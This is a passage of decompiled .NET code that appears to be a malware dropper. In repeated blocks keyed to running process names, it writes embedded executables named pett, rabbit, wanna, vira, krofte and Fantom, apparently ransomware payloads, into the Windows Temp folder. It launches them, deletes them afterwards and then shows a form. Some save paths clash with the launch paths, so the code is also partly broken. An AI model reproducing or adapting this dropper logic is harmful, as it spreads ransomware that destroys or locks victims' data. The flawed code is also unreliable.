				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array27 = processes;
		foreach (Process process27 in array27)
		{
			if (Operators.CompareString(text25, process27.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array28 = processes;
		foreach (Process process28 in array28)
		{
			if (Operators.CompareString(text26, process28.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array29 = processes;
		foreach (Process process29 in array29)
		{
			if (Operators.CompareString(text27, process29.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array30 = processes;
		foreach (Process process30 in array30)
		{
			if (Operators.CompareString(text28, process30.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array31 = processes;
		foreach (Process process31 in array31)
		{
			if (Operators.CompareString(text29, process31.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array32 = processes;
		foreach (Process process32 in array32)
		{
			if (Operators.CompareString(text30, process32.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array33 = processes;
		foreach (Process process33 in array33)
		{
			if (Operators.CompareString(text31, process33.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array34 = processes;
		foreach (Process process34 in array34)
		{
			if (Operators.CompareString(text32, process34.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				((Control)MyProject.Forms.Form2).Show();
			}
		}
		Process[] array35 = processes;
		foreach (Process process35 in array35)
		{
			if (Operators.CompareString(text33, process35.ProcessName, false) == 0)
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
				}
				save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
				Thread.Sleep(100);
				save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
				Thread.Sleep(100);
				Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
				Thread.Sleep(2000);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
